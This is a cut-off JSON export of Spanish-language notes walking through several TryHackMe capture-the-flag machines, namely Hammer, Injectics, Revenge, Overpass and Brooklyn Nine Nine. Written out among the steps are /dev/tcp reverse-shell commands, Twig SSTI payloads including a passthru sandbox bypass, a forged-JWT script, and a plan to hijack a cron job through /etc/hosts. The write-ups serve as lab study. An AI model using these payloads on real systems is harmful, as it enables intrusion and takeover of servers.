except:\n            pass\n\ndef main():\n    pines_iniciales = [i for i in range(0, 10000, 7)]\n    # Como ya sabemos que es el 1013, el script llegar√° r√°pido.\n    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:\n        executor.map(batch_worker, pines_iniciales)\n\nif __name__ == \"__main__\":\n    main()\n   ```\n   \n   Obtenemos lo siguiente:\n   ![[Pasted image 20251226063426.png]]\n\n10. Si metemos dicha cookie y OTP:\n    ![[Pasted image 20251226063621.png]]\n11. Si cambiamos la contrase√±a e iniciamos sesi√≥n:\n    ![[Pasted image 20251226063708.png]]\n    Hemos encontrado la flag del dashboard, nos queda la del sistema.\n12. Si probamos con ls vemos que hay un archivo `.php` de ejecuci√≥n de comandos.\n    ![[Pasted image 20251227214535.png]]\n13. Parece ser que hay un elemento que nos echa de la sesi√≥n. Si miramos el c√≥digo fuente:\n    ![[Pasted image 20251227215423.png]]\n    Podemos ver que si el valor `persistentCookie` no est√° en true nos echar√° todo el rato.\n14. Vamos a interceptar una petici√≥n de ejecuci√≥n de comandos con Burp Suite.\n    ![[Pasted image 20251227220212.png]]\n    Vemos que hay un archivo `.key`.\n15. Vamos a analizar el JWT con `jwt.io`.\n    ![[Pasted image 20251227220459.png]]\n16. Como tenemos acceso podemos listar el secreto `188ade1.key`.\n    ![[Pasted image 20251227220723.png]]\n17. Vamos a usar un script de python para generar el JWT.\n    \n```python\nimport jwt\n\n# The secret key from /var/www/mykey.key\nsecret_key = \"56058354efb3daa97ebab00fabd7a7d7\"\n\n# JWT header including 'kid'\nheader = {\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\",\n    \"kid\": \"/var/www/html/188ade1.key\"\n}\n\n# Payload with the 'admin' role\npayload = {\n    \"iss\": \"http://hammer.thm\",\n    \"aud\": \"http://hammer.thm\",\n    \"iat\": TiempoDeCreaci√≥n,\n    \"exp\": TiempoDeExpiraci√≥n (poner m√°s alto),\n    \"data\": {\n        \"user_id\": 1,\n        \"email\": \"tester@hammer.thm\",\n        \"role\": \"admin\"\n    }\n}\n\n# Encode the JWT with the specific header\ntoken = jwt.encode(payload, secret_key, algorithm=\"HS256\", headers=header)\n\n# Print the generated token\nprint(token)\n```\n\n18. Lo ejecutamos y obtenemos el JWT.\n    ![[Pasted image 20251227221145.png]]\n19. Metemos dicho token en el header authorization bearer y en el valor y ejecutamos un comando para leer `/home/ubuntu/flag.txt`.\n    \n    ![[Pasted image 20251227222238.png]]\n\n>[!CAUTION] Lee los scripts usados antes de utilizarlos para entender c√≥mo funcionan y qu√© cosas debes cambiar.\n\n>[!SUCCESS] Hemos conseguido obtener ambar flags. Tambi√©n podr√≠amos haber obtenido una reverse shell del sistema en nuestra m√°quina pero no era necesario para el prop√≥sito de la m√°quina.",
    "modified": "2025-12-28T01:00:21"
  },
  {
    "title": "1. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/8-injectics/1-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/1. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 8. Injectics",
    "content": "1. Vamos a empezar como siempre, con escaneos:\n\t1. Primero un escaneo a la IP, general.\n\t   ![[Pasted image 20260117123157.png]]\n\t2. Luego un escaneo m√°s profundo a aquellos puertos abiertos.\n\t   ![[Pasted image 20260117123343.png]]\n\t3. Seguimos con enumeraci√≥n de directorios.\n\t   ![[Pasted image 20260117134945.png]]\n\t4. Vamos a buscar archivos comunes, para ello usamos `dirsearch` que ya prueba algunas extensiones comunes por defecto.\n\t   ![[Pasted image 20260117135831.png]]\n\t5. Miramos el c√≥digo fuente.\n\t   ![[Pasted image 20260117131123.png]]\n\t   Parece que hemos encontrado un email v√°lido y el archivo donde se guardan estos.\n2. Ahora que tenemos unos cuantos directorios vamos a recopilar informaci√≥n de la aplicaci√≥n web.\n\t1. Empezando por el archivo `robots.txt`.\n\t   ![[Pasted image 20260117123714.png]]\n\t   No existe por lo que ya lo descartamos.\n\t2. Vamos a ver qu√© hay en la p√°gina principal.\n\t   ![[Pasted image 20260117123816.png]]\n\t   ![[Pasted image 20260117123859.png]]\n\t3. Si buscamos en estos botones, todos nos llevan a `#` menos `Login` que nos lleva a `login.php`.\n\t   ![[Pasted image 20260117124157.png]]\n\t   Volveremos aqu√≠ m√°s tarde.\n\t4. Vamos a ver qu√© vemos por los directorios que hab√≠amos sacado del escaneo de directorios.\n\t   ![[Pasted image 20260117124439.png]]\n\t   La p√°gina `phpmyadmin` es la √∫nica que no aparece `403 Forbidden`.\n3. Si miramos algunos de los archivos que encontramos con `dirsearch` encontramos lo siguiente.\n   ![[Pasted image 20260117135932.png]]\n   ![[Pasted image 20260117140008.png]]\n   Parece que hemos encontrado el framework de la web.\n4. Vamos a investigar la p√°gina `login.php`.\n\t1. Si le damos a `Login as Admin`, nos lleva a la p√°gina `adminLogin007.php`.\n\t   ![[Pasted image 20260117124651.png]]\n\t2. Vamos a intentar iniciar sesi√≥n en el login normal y ver que pasa con Burp Suite.\n\t   ![[Pasted image 20260117130222.png]]\n\t   Salta esto y ni siquiera llega a salir del cliente.\n\t3. Si investigamos un poco podemos llegar hasta el JS que hace que salte esta alerta.\n\t   ![[Pasted image 20260117130351.png]]\n\t   Aqu√≠ podemos ver que si esas palabras est√°n contenidas no nos dejar√° acceder ni siquiera a la petici√≥n de login, al haber puesto \"n**or**mal\" est√° cogiendo el \"or\" dentro de esta.\n\t4. Cambiamos el Email y volvemos a probar.\n\t   ![[Pasted image 20260117130816.png]]\n\t5. Ahora que ya tenemos la petici√≥n, vamos a jugar en Burp Suite.\n\t\t1. Lo primero vamos a ver si el filtro de \"OR\" est√° s√≥lo del lado del cliente.\n\t\t   ![[Pasted image 20260117130921.png]]\n\t\t   Hemos puesto \"prueban**or**mal\" y nos sale lo mismo que en la petici√≥n de arriba, por lo que parece que s√≠, s√≥lo era un filtro del lado del cliente.\n\t\t2. Vamos a probar a enviar ahora una petici√≥n con un correo real: `dev@injectics.thm`.\n\t\t   ![[Pasted image 20260117131359.png]]\n\t\t   Parece que no podemos obtener informaci√≥n de aqu√≠. \n5. Si recordamos el escaneo, hab√≠a un archivo donde se guardaban los correos: `mail.log`\n   ![[Pasted image 20260117131832.png]]\n   Estas credenciales s√≥lo valdr√≠an si algo le pasara a la tabla `users` por lo que no nos valen.\n6. Vamos a probar diferentes payloads de alguna [lista de github](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/SQL-Injection-Auth-Bypass-Payloads.txt) en el Intruder de Burp Suite. Primero probaremos en el campo email.\n   ![[Pasted image 20260117133044.png]]\n7. Despu√©s de esperar un poco obtenemos el payload.\n   ![[Pasted image 20260117133252.png]]\n8. Cambiamos la cookie de sesi√≥n `PHPSESSID` al valor hecho en la petici√≥n validada y vamos al endpoint que nos marca la respuesta.\n   ![[Pasted image 20260117133650.png]]\n9. Si recordamos lo que dec√≠a la p√°gina de `mail.log` era que si algo le pasaba a la tabla `users` se habilitar√≠an las cuentas que aparec√≠an all√≠. Vamos a editar alguna entrada y a corroborar esto.\n   ![[Pasted image 20260117133809.png]]\n   Despu√©s de hacer esto e intentar loguearnos como admin parece que nada cambia.\n10. Vamos a intentar introducir un cambio con una query (ataque de segundo orden SQLi).\n   ![[Pasted image 20260117134336.png]]\n   Parece que hay validaci√≥n, vamos a cambiar el payload.\n11. Probamos ahora a quitar las comillas.\n    ![[Pasted image 20260117134424.png]]\n    Parece que ahora s√≠ nos deja.\n    ![[Pasted image 20260117134447.png]]\n    Y encima se han cambiado todos los oros.\n12. Vamos a borrar la base de datos, por lo que dec√≠a en el email.\n    ![[Pasted image 20260117134543.png]]\n    ![[Pasted image 20260117134601.png]]\n13. Vamos ahora a iniciar sesi√≥n como admin.\n    ![[Pasted image 20260117134659.png]]\n14. Si recordamos el an√°lisis, el motor de plantillas era twig que permite crear dinamismo mediante etiquetas como `{{ }}`.\n    ![[Pasted image 20260117140315.png]]\n15. Parece que es susceptible de SSTI.\n    ![[Pasted image 20260117140343.png]]\n16. Si probamos ahora a poner `{{ system(\"ls\") }}`, nos salta con:\n    ![[Pasted image 20260117140645.png]]\n17. Encontramos la forma de mandarnos una reverse shell `{{ [\"bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/PUERTO_ATACANTE 0>&1'\"] | map(\"system\") | join }}`.\n\t1. Nos ponemos en escucha.\n\t   ![[Pasted image 20260117141147.png]]\n\t2. Metemos el payload en la plantilla.\n\t   ![[Pasted image 20260117141308.png]]\n\t3. Por desgracia nos salta un error.\n\t   ![[Pasted image 20260117141615.png]]\n18. Despu√©s de mucho quebradero de cabeza y de darnos cuenta de que estamos en una sandbox con restricciones (debido a que `passthru` lo pone), llegamos a un payload que funciona: `{{['id','']|sort('passthru')}}`. Aqu√≠ creamos un array as√≠ `['id', '']`. Despu√©s con sort especificamos la funci√≥n de ordenado, pero esto no comprueba que sea una funci√≥n de ordenado, solo lo intenta ejecutar. Passthru en PHP ejecuta un comando del sistema operativo y muestra su salida sin procesar.\n    ![[Pasted image 20260117145310.png]]\n    ![[Pasted image 20260117145324.png]]\n19. Listamos el directorio `/flags` sustituyendo `id` por `ls flags`.\n    ![[Pasted image 20260117145453.png]]\n20. Leemos el documento.\n    ![[Pasted image 20260117145558.png]]\n    \n21. Obtenemos la flag.\n    ![[Pasted image 20260117145609.png]]\n\n>[!SUCCESS] Hemos conseguido obtener ambas flags. Para ello hemos tenido que utilizar SQLi de primer y segundo orden para obtener la primera flag y m√°s adelante SSTI para obtener la segunda flag.",
    "modified": "2026-01-18T00:59:42"
  },
  {
    "title": "0. Injectics",
    "path": "/apuntes/thm/maquinas/2-medium/8-injectics/0-injectics/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 8. Injectics",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/1. Getting the Flags]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Whats Your Name",
    "path": "/apuntes/thm/maquinas/2-medium/9-whats-your-name/0-whats-your-name/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 9. Whats Your Name",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/1. Getting the flags]]",
    "modified": "2026-02-15T01:10:58"
  },
  {
    "title": "1. Getting the flags",
    "path": "/apuntes/thm/maquinas/2-medium/9-whats-your-name/1-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/1. Getting the flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 9. Whats Your Name",
    "content": "",
    "modified": "2026-02-15T01:10:58"
  },
  {
    "title": "2. Revengeee",
    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/2-revengeee/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/2. Revengeee.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
    "content": "![[Pasted image 20251120195708.png]]\n\n¬°Esta es la venganza! Billy Joel te ha contratado para introducirte y defacear (modificar la p√°gina principal) la p√°gina de **Rubber Ducky Inc.**. √âl fue despedido, probablemente por buenos motivos pero a qui√©n le importa, t√∫ est√°s aqu√≠ por la pasta. ¬øPuedes completar tu parte del trato?",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Message from Billy Joel",
    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/1-message-from-billy-joel/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/1. Message from Billy Joel.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
    "content": "![[Pasted image 20251120195456.png]]\n\nBilly Joel te ha mandado un mensaje en relaci√≥n a tu misi√≥n.\n\n![[Pasted image 20251120195524.png]]\n\n```txt\nTo whom it may concern,\n\nI know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy \nand left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  \nI've done some initial enumeration of the site because I know *some* things about hacking but not enough.  \nFor that reason, I'll let you do your own enumeration and checking.\n\nWhat I want you to do is simple.  Break into the server that's running the website and deface the front page.  \nI don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.\n\nWhen you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  \nHalf up-front and half when you finish.\n\nGood luck,\n\nBilly\n```\n\nLa traducci√≥n:\n\n```txt\nA quien corresponda:\n\nS√© que fuiste t√∫ quien hacke√≥ mi blog. Me impresionaron mucho tus habilidades. Fuiste un poco descuidado,\n\ny dejaste algunas huellas, as√≠ que pude rastrearte. Pero gracias por aceptar mi oferta.\n\nHe realizado una evaluaci√≥n inicial del sitio porque s√© algunas cosas sobre hacking, pero no lo suficiente.\n\nPor eso, te dejo que hagas tu propia evaluaci√≥n y comprobaci√≥n.\n\nLo que quiero que hagas es simple: accede al servidor que aloja el sitio web y modifica la p√°gina principal.\n\nNo me importa c√≥mo lo hagas, solo hazlo. Pero recuerda: ¬°NO DEJES EL SITIO FUERA DE SERVICIO! No queremos causar da√±os irreparables.\n\nCuando termines el trabajo, recibir√°s el resto del pago. Acordamos $5,000.\n\nLa mitad por adelantado y la otra mitad al terminar.\n\nBuena suerte,\n\nBilly\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Finding the flags",
    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/3-finding-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/3. Finding the flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
    "content": "1. Vamos a la p√°gina que nos dan.\n   ![[Pasted image 20251120201019.png]]\n   Una vez all√≠ investigamos las p√°ginas y encontramos algunas:\n\t- Home\n\t- Products\n\t- Contact\n\t- Login\n2. Pero como somos gente curiosa no nos quedamos ah√≠ y vamos a hacer un escaneo m√°s profundo con nuestra herramienta de elecci√≥n. En mi caso voy a usar `gobuster`.\n   ![[Pasted image 20251120203103.png]]\n   Hemos encontrado dos directorios que no aparec√≠an directamente en la web, aunque el directorio `/static` parece estas en estado `403 Forbbiden`.\n3. Comprobamos lo que hay en `/admin`.\n   ![[Pasted image 20251120223956.png]]\n   Parece que hemos encontrado el login del administrador, pero no tenemos credenciales (todav√≠a).\n4. Vamos a hacer un nmap, no sea que estemos pasando algo por alto.\n   ![[Pasted image 20251120231017.png]]\n   Parece que est√° abierto el puerto SSH, hmmm...\n5. Volvamos a investigar el resto de las p√°ginas. No vemos nada interesante (m√°s all√° de la p√°gina de login normal, pero nosotros ya tenemos la del admin) hasta que llegamos a la p√°gina `/products`.\n   ![[Pasted image 20251120224808.png]]\n6. Si hacemos click en alguno de los productos, vemos que en la URL aparece un n√∫mero (que pareciera ser el ID del producto en cuesti√≥n).\n   ![[Pasted image 20251120224916.png]]\n7. Si probamos a cambiar ese n√∫mero por uno que no exista, como `0`, vemos que el servidor no responde con un `404 Not Found`, sino con un `500 Internal Server Error`, por lo que sabemos que esos n√∫meros no son p√°ginas html sino en efecto IDs que se est√°n comprobando en una base de datos.\n   ![[Pasted image 20251120225058.png]]\n8. Vamos a probar la herramienta `SQLMap` con esta URL.\n   ![[Pasted image 20251120225313.png]]\n9. Despu√©s de esperar un poco, obtenemos las bases de datos:\n   ![[Pasted image 20251120225351.png]]\n10. Ahora s√≥lo queda ir abri√©ndonos paso hasta dar con las credenciales de un administrador.\n\t1. Primero sacamos las tablas.\n\t   ![[Pasted image 20251120225513.png]]\n\t2. Luego dumpeamos la tabla que nos interesa (en nuestro caso los usuarios m√°s interesantes estar√°n en `system_user`).\n\t   ![[Pasted image 20251120225641.png]]\n\t   ¬°Vaya! Parece que est√°n hasheadas. Bueno, eso no va a ser un impedimento para nosotros.\n11. Antes de continuar vamos a ver que hay en la tabla users tambi√©n.\n    ![[Pasted image 20251120231302.png]]\n    Vaya vaya, parece que aqu√≠ tenemos nuestra **primera flag**.\n12. Cogemos la contrase√±a hasheada del administrador. Por el comienzo sabemos que es un bcrypt. Vamos a descifrarla.\n\t1. Buscamos el tipo de hash. Y metemos el nuestro en un archivo.\n\t   ![[Pasted image 20251120230437.png]]\n\t2. Lo deshasheamos con la herramienta `hashcat`.\n\t   ![[Pasted image 20251120230358.png]]\n13. Vamos a loguearnos. Pero lo vamos a hacer por SSH en el servidor, ya que no tiene mucho sentido hacerlo en la p√°gina, cuando lo que queremos es hacerle un deface a la p√°gina.\n    ![[Pasted image 20251120231510.png]]\n    Estamos dentro, veamos qu√© hay por aqu√≠.\n14. Hacemos un `ls` y ¬°sorpresa!\n    ![[Pasted image 20251120231559.png]]\n15. S√≥lo nos queda hacer el deface. Pero antes vamos a mirar que hay en `/root`, ¬øno? Por curiosidad.\n    ![[Pasted image 20251120231735.png]]\n    Vaya, parece que nos hemos encontrado un problema, tendremos que escalar privilegios.\n16. Veamos qu√© comandos podemos ejecutar: con `sudo -l`.\n    ![[Pasted image 20251120231903.png]]\n    Parece que podemos jugar con un servicio como root... ¬°y encima podemos editarlo! Ya est√°, el c√≥ctel perfecto.\n17. Vamos a editar dicho servicio. Como sabemos que lo ejecuta el sistema (es decir que tiene permisos de administrador) vamos a intentar mandarnos una reverse shell.\n\t1. Vamos a la p√°gina de [Shell Generator](www.revshells.com) y buscamos una que nos guste.\n\t   ![[Pasted image 20251120232159.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251120232228.png]]\n\t3. Editamos el servicio para que ejecute el siguiente comando: `sh -i >& /dev/tcp/192.168.129.186/9000 0>&1`, el cual nos mandar√° una reverse shell.\n\t   ![[Pasted image 20251120232512.png]]\n\t   ![[Pasted image 20251120232530.png]]\n\t4. Debemos editar el ExecStart y el usuario que lo ejecuta.\n\t   ![[Pasted image 20251120233209.png]]\n18. Hacemos un reload del daemon seguido de un restart del servicio, que eran dos comandos a los que tambi√©n ten√≠amos acceso.\n    ![[Pasted image 20251120233100.png]]\n19. Y tal cual acabamos de conseguir ser root.\n    ![[Pasted image 20251120233304.png]]\n20. Ahora s√≠ vamos a mirar qu√© hay en `/root` seguro que est√° la flag.\n    ![[Pasted image 20251120233351.png]]\n    Pues no xD\n21. Bueno, vamos a hacer lo que nos ped√≠a el reto, hacerle un defacement a la p√°gina principal.\n    ![[Pasted image 20251120233541.png]]\n    Como estoy de mal humor porque no he visto la flag todavia mando la p√°gina principal a la mierda >:(\n22. A ver si ahora ya est√° la flag por alg√∫n sitio.\n    ![[Pasted image 20251120233823.png]]\n\n\n>[!SUCCESS] UEEEEE! Hemos encontrado las 3 flags. \n\npwned by xut",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Revenge",
    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/0-revenge/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/0. Revenge.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
    "content": "[[1. Message from Billy Joel]]\n[[2. Revengeee]]\n[[3. Finding the flags]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the Flags",
    "path": "/apuntes/thm/maquinas/1-easy/7-overpass/2-finding-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/7. Overpass/2. Finding the Flags.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 7. Overpass",
    "content": "1. Vamos a realizar enumeraci√≥n.\n\t1. Primero de puertos.\n\t   ![[Pasted image 20251220235400.png]]\n\t2. Ahora un escaneo de esos puertos abiertos.\n\t   ![[Pasted image 20251220235502.png]]\n\t3. Ahora directorios.\n\t   ![[Pasted image 20251221000515.png]]\n2. Ahora vamos a la web.\n\t1. La p√°gina principal.\n\t   ![[Pasted image 20251221000618.png]]\n\t   ![[Pasted image 20251221001103.png]]\n\t   Vemos algo sobre los romanos. ¬øPuede estarse refiriendo a cifrado C√©sar?\n\t2. En `/admin`.\n\t   ![[Pasted image 20251221001152.png]]\n\t3. En `/aboutus` parece que hay una posible lista de usuarios.\n\t   ![[Pasted image 20251221001343.png]]\n3. Vamos a investigar `/admin`, parece lo m√°s prometedor.\n\t1. Si abrimos Burp Suite y capturamos una petici√≥n err√≥nea.\n\t   ![[Pasted image 20251221001624.png]]\n\t2. Vamos  a mandarlo al repetidor.\n\t   ![[Pasted image 20251221001703.png]]\n\t3. Vamos a probar a capturar la respuesta del servidor.\n\t   ![[Pasted image 20251221002421.png]]\n\t4. Cambiamos la respuesta a `Correct credentials`, le damos a \"Forward\", quitamos el \"Intercept\" y conseguimos una clave privada.\n\t   ![[Pasted image 20251221002813.png]]\n4. Ahora nos guardamos la clave privada, le cambiamos los permisos a `600` y la usamos con `-i` para entrar por ssh.\n   \n5. No podemos porque est√° encriptada. Vamos a desencriptarla para crackearla. Para ello necesitamos primero convertirla a un formato que `john` entienda. Para ello usamos `ssh2john`.\n   ![[Pasted image 20251221003948.png]]\n6. Iniciamos sesi√≥n como `james`.\n   ![[Pasted image 20251221004358.png]]\n7. Encontramos `user.txt`.\n   ![[Pasted image 20251221004427.png]]\n8. No podemos hacer `sudo -l` por lo que nos ponemos a mirar m√°s y encontramos `.overpass`.\n   ![[Pasted image 20251221005535.png]]\n9. Si le preguntamos a Gemini si reconoce este tipo de cifrado nos dice que es ROT47.\n   ![[Pasted image 20251221005717.png]]\n10. Si se lo damos a CyberChef.\n    ![[Pasted image 20251221005946.png]]\n11. No hemos encontrado nada que hacer con ese usuario y contrase√±a de momento por lo que seguimos mirando. Ahora `/etc/crontab`.\n    ![[Pasted image 20251221010618.png]]\n    Parece que root carga un script desde internet si conseguimos modificarlo tenemos acceso.\n12. Vamos a mirar a quien le pertenece `/etc/hosts`.\n    ![[Pasted image 20251221010922.png]]\n    Parece que todos pueden escribir. Vamos a cambiar la redirecci√≥n a nuestra propia m√°quina.\n13. Creamos un script que mande una reverse shell a nuestra m√°quina y lo servimos.\n    ![[Pasted image 20251221012235.png]]\n    ![[Pasted image 20251221012251.png]]\n    Es importante hacerlo en el puerto 80 porque `curl` manda la petici√≥n al puerto 80.\n14. Nos ponemos en escucha por el puerto que hemos puesto en el script.\n    ![[Pasted image 20251221011236.png]]\n15. Modificamos el `/etc/hosts` para que ponga `192.168.128.94    overpass.thm` nos llega la conexi√≥n.\n    ![[Pasted image 20251221011937.png]]\n16. Y obtenemos la flag de root.\n    ![[Pasted image 20251221011956.png]]\n\n>[!SUCCESS] Por fin hemos conseguido las dos flags!! Que m√°quina m√°s divertida :)",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/1-easy/7-overpass/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/7. Overpass/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 7. Overpass",
    "content": "![[Pasted image 20251220234918.png]]\n\n¬øQu√© pasa cuando un grupo de estudiantes de Computer Science sin dinero intentan hacer un gestor de contrase√±as?\n\nObviamente un √©xito comercial perfecto.",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "0. Overpass",
    "path": "/apuntes/thm/maquinas/1-easy/7-overpass/0-overpass/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/7. Overpass/0. Overpass.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 7. Overpass",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/7. Overpass/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/7. Overpass/2. Finding the Flags]]",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/1-easy/5-brooklyn-nine-nine/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/5. Brooklyn Nine Nine/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 5. Brooklyn Nine Nine",
    "content": "![[Pasted image 20251124182648.png]]\n\nEsta m√°quina est√° orientada a hackers principiantes. Hay dos maneras de rootear la m√°quina.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the flags",
    "path": "/apuntes/thm/maquinas/1-easy/5-brooklyn-nine-nine/2-finding-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/5. Brooklyn Nine Nine/2. Finding the flags.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 5. Brooklyn Nine Nine",
    "content": "<h2>User flag</h2>\n1. Escaneamos la direcci√≥n que nos dan.\n   ![[Pasted image 20251124182922.png]]\n2. Miraremos las versiones de los servicios en esos puertos.\n   ![[Pasted image 20251124183056.png]]\n3. Vamos a mirar a ver qu√© hay en la web.\n   ![[Pasted image 20251124183324.png]]\n4. Miramos el c√≥digo fuente.\n   ![[Pasted image 20251124183426.png]]\n   Hay un comentario raro sobre \"esteganograf√≠a\".\n5. Miramos qu√© quiere decir eso.\n   ![[Pasted image 20251124183523.png]]\n   Parece que nos est√° diciendo que hay algo oculto en la foto. Vamos a comprobarlo.\n6. Introducimos la URL de la fotograf√≠a para descargarla:\n   ![[Pasted image 20251124183624.png]]\n7. Miramos a ver qu√© tipo de archivo es.\n   ![[Pasted image 20251124183848.png]]\n8. Miramos con una herramienta dedicada, como `exiftool`.\n   ![[Pasted image 20251124184046.png]]\n   No parece que haya nada muy interesante por aqu√≠ de momento.\n9. Vamos a escanear la p√°gina en busca de posibles directorios.\n   ![[Pasted image 20251124184840.png]]\n   Pues parece que por aqu√≠ tampoco hay nada interesante.\n10. Vamos a escanear los servicios m√°s a fondo.\n    ![[Pasted image 20251124185058.png]]\n    Est√° permitido el anonymous login, vamos a ver que hay por el servidor, hehe.\n11. Nos conectamos por ftp an√≥nimo.\n    ![[Pasted image 20251124185509.png]]\n12. Veamos lo que hay.\n    ![[Pasted image 20251124185537.png]]\n    Una nota para Jake. Veamos qu√© contiene.\n13. Parece que la contrase√±a de Jake no es muy segura que digamos.\n    ![[Pasted image 20251124185656.png]]\n14. Usaremos `hydra` para hacer un ataque de fuerza bruta sobre la cuenta de Jake.\n    ![[Pasted image 20251124185844.png]]\n    Parece que hemos encontrado su contrase√±a.\n15. Nos logueamos como jake.\n    ![[Pasted image 20251124185938.png]]\n16. Vamos a ver qu√© hay por aqu√≠.\n    ![[Pasted image 20251124190228.png]]\n\n-------------------------------\n<h2>Root flag</h2>\n1. Miramos a ver qu√© comandos podemos ejecutar con permiso de administrador.\n   ![[Pasted image 20251124190355.png]]\n2. Buscamos c√≥mo se puede escalar privilegios con el comando `less`.\n   ![[Pasted image 20251124190543.png]]\n3. Seguimos los pasos que nos dice:\n\t1. Copiamos `/etc/passwd` por ejemplo a un archivo nuevo de nuestra elecci√≥n.\n\t   ![[Pasted image 20251124190954.png]]\n\t2. Ejecutamos el comando `sudo less buenas.txt`.\n\t   ![[Pasted image 20251124191053.png]]\n\t3. En la consola de less escribimos `!/bin/sh` y le damos a `Enter`.\n\t   ![[Pasted image 20251124191213.png]]\n\t   Parece que ya somos root.\n4. Obtenemos la flag.\n   ![[Pasted image 20251124191501.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Brooklyn Nine Nine",
    "path": "/apuntes/thm/maquinas/1-easy/5-brooklyn-nine-nine/0-brooklyn-nine-nine/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/5. Brooklyn Nine Nine/0. Brooklyn Nine Nine.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 5. Brooklyn Nine Nine",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/5. Brooklyn Nine Nine/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/5. Brooklyn Nine Nine/2. Finding the flags]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the Flags",
    "path": "/apuntes/thm/maquinas/1-easy/6-takeover/2-finding-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/6. TakeOver/2. Finding the Flags.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 6. TakeOver",
    "content": "1. Vamos al sitio web.\n   ![[Pasted image 20251220231157.png]]\n2. Mientras investigamos el sitio web vamos a hacer reconocimiento t√≠pico.\n\t1. Un escaneo de puertos abiertos.\n\t   ![[Pasted image 20251220225601.png]]\n\t2. Un escaneo de puertos en detalle.\n\t   ![[Pasted image 20251220225705.png]]\n\t3. Un escaneo de descubrimiento de directorios.\n\t   ![[Pasted image 20251220230443.png]]\n\t4. Escaneo de subdominios.\n\t   ![[Pasted image 20251220233651.png]]\n3. Si miramos los certificados de esos subdominios no encontramos nada, por lo que como se nos comentaba que el support estaba en reconstrucci√≥n vamos a mirar ah√≠.\n   ![[Pasted image 20251220233840.png]]\n4. Si vamos a a este subdominio en el puerto 80:\n   ![[Pasted image 20251220234134.png]]",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "0. TakeOver",
    "path": "/apuntes/thm/maquinas/1-easy/6-takeover/0-takeover/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/6. TakeOver/0. TakeOver.md",
    "breadcrumb": "THM > Maquinas > 1. Easy > 6. TakeOver",
    "content": "[[1. Help Us]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/6. TakeOver/2. Finding the Flags]]",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "1. Help Us",
    "path": "/apuntes/thm/maquinas/1-easy/6-takeover/1-help-us/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/6. TakeOver/1. Help Us.md",
